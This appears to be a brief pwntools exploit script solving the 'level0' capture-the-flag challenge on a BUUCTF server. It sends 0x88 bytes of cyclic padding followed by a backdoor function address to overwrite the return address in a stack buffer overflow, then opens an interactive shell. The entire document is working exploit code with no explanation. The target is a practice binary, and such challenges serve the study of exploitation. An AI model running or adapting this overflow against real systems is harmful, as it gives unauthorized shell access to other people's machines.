from pwn import *

context.log_level = 'debug'
io = remote('node3.buuoj.cn', 27050)
# io = process('level0')
backdoor = 0x400596

payload = cyclic(0x88) + p64(backdoor)
io.sendline(payload)
io.interactive()
